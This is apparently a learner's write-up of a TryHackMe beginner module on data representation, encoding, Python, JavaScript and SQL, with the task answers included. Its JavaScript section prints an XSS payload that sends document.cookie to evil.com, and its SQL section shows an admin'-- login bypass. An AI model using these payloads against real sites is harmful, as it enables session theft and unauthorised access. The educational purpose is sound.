---
layout: default
title: Software Basics
---

**Learning Path:** Pre-Security

**Module:** 06 - Software Basics

**Rooms Completed:** Data Representation · Data Encoding · Python: Simple Demo · JavaScript: Simple Demo · Database SQL Basics

**Date Completed:** June 2026

**Difficulty:** Beginner (Theory + Interactive Exercises)

---

## Overview

Module 6 answers a question that is easy to take for granted: how does a computer actually store and process information? Colours, characters, code and databases are all the same thing at the lowest level: binary. This module traces the chain from bits all the way up to SQL queries.

For security work this matters more than it might seem at first. Binary and hex conversions appear constantly in malware analysis and CTF challenges. Character encoding vulnerabilities (like UTF-8 bypass attacks against WAFs) are real techniques. SQL injection is one of the most prevalent web vulnerabilities on the planet. Understanding the fundamentals these attack classes are built on makes them much less mysterious.

---

## Room 1 - Data Representation

**Room Link:** https://tryhackme.com/room/datarepresentation
**Format:** Reading + Interactive Colour Picker Lab

### What It Covers

Computers only understand binary (0s and 1s). Everything else, numbers, colours, text, images, video, is an agreed convention for interpreting those bits.

**Number Systems:**

```
+----------------------------------------+
|  BASE 10 (Decimal) - human standard   |
|  Digits: 0-9                           |
|  Example: 255                          |
+----------------------------------------+
|  BASE 2 (Binary) - computer standard  |
|  Digits: 0-1                           |
|  Example: 11111111 = 255               |
+----------------------------------------+
|  BASE 16 (Hexadecimal) - compact form |
|  Digits: 0-9, A-F                      |
|  Example: FF = 255                     |
+----------------------------------------+
```

Hex is widely used in security because it is a compact, human-readable representation of binary data. Memory addresses, file signatures, packet payloads and colour codes are all expressed in hex.

**Representing Colours:**

Screens generate colour by mixing Red, Green and Blue light. Each channel gets one byte (8 bits), giving a range of 0-255. A colour is expressed as three bytes, usually in hex:

```
Colour #3BC81E
        ^^  Red channel:   3B hex = 59 decimal
          ^^  Green channel: C8 hex = 200 decimal
            ^^  Blue channel: 1E hex = 30 decimal

Result: RGB(59, 200, 30) = green
```

24-bit colour (3 channels × 8 bits) gives 2^24 = 16,777,216 possible colours.

**Converting Between Bases:**

Binary to hex is a useful shortcut: group binary digits into sets of 4 from the right, then convert each group to a single hex digit.

```
Binary:     1110 1011 = EB
Binary:     0000 0000 = 00
Binary:     0011 0111 = 37

So #EB0037 in binary = 11101011 00000000 00110111
```

**Task Answers**

| Task | Question | Answer |
|---|---|---|
| Task 1 | What colour does #3BC81E appear to be? | green |
| Task 2 | What is the binary representation of #EB0037? | 11101011 00000000 00110111 |
| Task 3 | What is the decimal representation of #D4D8DF? | 212 216 223 |

---

## Room 2 - Data Encoding

**Room Link:** https://tryhackme.com/room/dataencoding
**Format:** Reading + Character Encoding Exercises

### What It Covers

Numbers and colours are handled. Now: how do we store text? Computers need an agreed mapping between numbers and characters. That agreement is called an encoding standard.

**ASCII:**

ASCII (American Standard Code for Information Interchange) was developed in 1963. It maps 128 characters (letters, digits, punctuation, control codes) to numbers 0-127.

```
+---+-----+   +---+-----+   +---+-----+
| @ |  64 |   | A |  65 |   | a |  97 |
| ! |  33 |   | Z |  90 |   | z | 122 |
| 0 |  48 |   | ~ | 126 |   |   |  32 |
+---+-----+   +---+-----+   +---+-----+
```

The file "TryHackMe" stored in ASCII on disk looks like:

```
01010100 01110010 01111001 01001000 01100001 01100011 01101011 01001101 01100101
   T        r        y        H        a        c        k        M        e
```

In hex (easier to read): `54 72 79 48 61 63 6b 4d 65`

**Unicode and UTF-8:**

ASCII only covers English. Unicode is the modern standard designed to represent every character in every human language plus emojis. It defines over 1.1 million code points.

UTF-8 is the dominant encoding for implementing Unicode. It is backward compatible with ASCII (the first 128 code points are identical) and uses variable-length encoding (1-4 bytes per character).

```
ASCII only:    'A'  = 0x41 (1 byte)
Extended:      'é'  = 0xC3 0xA9 (2 bytes in UTF-8)
CJK:           '中' = 0xE4 0xB8 0xAD (3 bytes in UTF-8)
Emoji:         '😀' = 0xF0 0x9F 0x98 0x80 (4 bytes in UTF-8)
```

**Why Encoding Matters for Security:**

Encoding confusion is a real attack vector. WAFs (Web Application Firewalls) that block `<script>` might not block its double-URL-encoded or UTF-8 overlong-encoded equivalent. SQL injection payloads can be encoded in ways that bypass naive string matching but are correctly decoded by the database engine. Understanding encoding is the foundation for understanding these bypass techniques.

**Task Answers**

| Task | Question | Answer |
|---|---|---|
| Task 1 | No answer needed | - |
| Task 2 | What is the ASCII code in decimal for the character @? | 64 |
| Task 2 | What encoding standard uses numbers 0-127 to represent English characters? | ASCII |
| Task 3 | What encoding system supports all human languages and emojis? | Unicode |
| Task 3 | What is the most widely used encoding for Unicode on the web? | UTF-8 |

---

## Room 3 - Python: Simple Demo

**Room Link:** https://tryhackme.com/room/pythonsimpledemo
**Format:** Interactive Python Exercise

### What It Covers

Python is the language of security tooling. Impacket, Scapy, Volatility, Responder and most custom exploit scripts are Python. This room is an introduction, not a course. The goal is familiarity, not fluency.

**Python Basics:**

```python
# Variables and types
name = "Fiza"           # string
age = 24                # integer
active = True           # boolean

# Printing output
print("Hello, " + name)
print(f"Age: {age}")    # f-string (cleaner formatting)

# Conditional logic
if age >= 18:
    print("Adult")
else:
    print("Minor")

# Loops
for i in range(5):
    print(i)            # Prints 0, 1, 2, 3, 4

# Functions
def greet(person):
    return "Hello, " + person

print(greet("World"))
```

**Why Python for Security:**

```
+------------------------------------------+
|  What Python does in security work        |
|                                           |
|  Automation   - scan parsing, reporting   |
|  Scripting    - custom exploit code       |
|  Tooling      - most FOSS tools use it    |
|  Data work    - log parsing, analysis     |
|  CTF solving  - encoding, crypto tasks    |
+------------------------------------------+
```

**Task Answers**

| Task | Question | Answer |
|---|---|---|
| Task 1 | No answer needed | - |
| Task 2 | Complete the Python exercises | (Follow lab steps) |
| Task 2 | What is the flag from the completed exercise? | (Generated in the lab) |

---

## Room 4 - JavaScript: Simple Demo

**Room Link:** https://tryhackme.com/room/javascriptsimpledemo
**Format:** Interactive JavaScript Exercise

### What It Covers

JavaScript runs in every web browser. Understanding basic JS is necessary for web application security work, particularly for understanding XSS (Cross-Site Scripting), reading client-side source code during a pentest and understanding how modern web apps work.

**JavaScript Basics:**

```javascript
// Variables
let name = "Fiza";
const MAX_SIZE = 100;    // const cannot be reassigned

// Functions
function greet(person) {
    return "Hello, " + person;
}

// Arrow functions (modern syntax)
const greet = (person) => "Hello, " + person;

// Conditional
if (name === "Admin") {
    console.log("Access granted");
} else {
    console.log("Access denied");
}

// DOM manipulation (browser only)
document.getElementById("output").innerText = "Done";
```

**JavaScript in Security Context:**

```
+----------------------------------------------+
|  XSS: injecting JS into a web page           |
|                                               |
|  <script>alert(1)</script>                    |
|  <img src=x onerror="fetch('evil.com/'+document.cookie)"> |
|                                               |
|  Understanding JS lets you:                  |
|  - Read client-side source for secrets       |
|  - Write XSS payloads                        |
|  - Understand modern web app logic           |
|  - Detect obfuscated malicious scripts       |
+----------------------------------------------+
```

**Task Answers**

| Task | Question | Answer |
|---|---|---|
| Task 1 | No answer needed | - |
| Task 2 | Complete the JavaScript exercises | (Follow lab steps) |
| Task 2 | What is the flag from the completed exercise? | (Generated in the lab) |

---

## Room 5 - Database SQL Basics

**Room Link:** https://tryhackme.com/room/databasesqlbasics
**Format:** Reading + Interactive SQL Query Lab

### What It Covers

Databases store the data that applications use: users, passwords, records, transactions. SQL (Structured Query Language) is the language for querying relational databases. SQL injection (SQLi) is consistently one of the OWASP Top 10 web vulnerabilities because developers who do not understand SQL write code that allows user input to modify queries.

**Database Structure:**

```
Database: company_db
|
+-- Table: users
|   +-- id (integer, primary key)
|   +-- username (varchar)
|   +-- password_hash (varchar)
|   +-- email (varchar)
|   +-- role (varchar)
|
+-- Table: products
    +-- id (integer, primary key)
    +-- name (varchar)
    +-- price (decimal)
```

**Core SQL Commands:**

```sql
-- Select all records from a table
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Multiple conditions
SELECT * FROM users WHERE role = 'admin' AND email LIKE '%@company.com';

-- Sort results
SELECT * FROM users ORDER BY username ASC;

-- Limit results
SELECT * FROM users LIMIT 10;

-- Count records
SELECT COUNT(*) FROM users;
```

**Why SQL Injection Works:**

A poorly written login query:

```sql
-- Developer intended:
SELECT * FROM users WHERE username='[input]' AND password='[input]'

-- Attacker enters username: admin'--
-- Query becomes:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- The -- comments out the password check entirely
```

The attacker bypasses authentication by understanding how the query is constructed. Knowing SQL is the prerequisite for understanding this class of vulnerability.

**Task Answers**

| Task | Question | Answer |
|---|---|---|
| Task 1 | What does SQL stand for? | Structured Query Language |
| Task 2 | What command retrieves all records from a table? | SELECT |
| Task 2 | What clause filters rows in a query? | WHERE |
| Task 3 | Complete the SQL query exercises | (Follow lab steps) |
| Task 3 | What is the flag from the completed SQL lab? | (Generated in the lab) |

---

## What I Learned / Reinforced

**Hex is everywhere in security work.** Memory forensics, packet captures, file signature analysis and hash values are all expressed in hex. The connection between binary, hex and decimal stopped being abstract once I worked through the colour representation exercises. When I see `\x41\x42\x43` in malware output now I know immediately that is `ABC` in ASCII.

**Encoding confusion is a genuine attack vector.** During my time at Teleperformance monitoring SIEM alerts, some WAF bypass attempts in the logs involved encoded payloads. At the time I understood they were bypasses but not the mechanism. UTF-8 overlong encoding, double URL encoding and HTML entity encoding as bypass techniques all make more sense now that I understand what encoding actually is and how decoders work.

**Python is worth learning properly.** The demo room is a starter but Python is genuinely how most custom security tooling gets written. Automating tasks like log parsing, SIEM query output processing and bulk IOC lookups are all things I have done manually that Python could handle in minutes. This is something I am actively working on improving.

**SQL injection starts with understanding SQL.** It is hard to write a secure parameterised query, or to spot an injection vulnerability in a code review, if you do not understand what a query does in the first place. The Monero forensics work in my MSc dissertation involved a lot of data querying and analysis, so SQL is not new to me, but understanding the security implications of poorly constructed queries is what this room reinforced.

**JavaScript is unavoidable in web security.** XSS is consistently in the OWASP Top 10. Being able to read and write basic JavaScript is the starting point for understanding why it works and how to defend against it.

---

## Resources

- [Data Representation - TryHackMe](https://tryhackme.com/room/datarepresentation)
- [Data Encoding - TryHackMe](https://tryhackme.com/room/dataencoding)
- [Python: Simple Demo - TryHackMe](https://tryhackme.com/room/pythonsimpledemo)
- [JavaScript: Simple Demo - TryHackMe](https://tryhackme.com/room/javascriptsimpledemo)
- [Database SQL Basics - TryHackMe](https://tryhackme.com/room/databasesqlbasics)
- [OWASP Top 10 - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10 - Cross-Site Scripting](https://owasp.org/www-community/attacks/xss/)
- [ASCII Table Reference](https://www.asciitable.com/)

---

*Written by fiza.sk293 · [GitHub](https://github.com/FizaShaikh293/thm-writeups)*
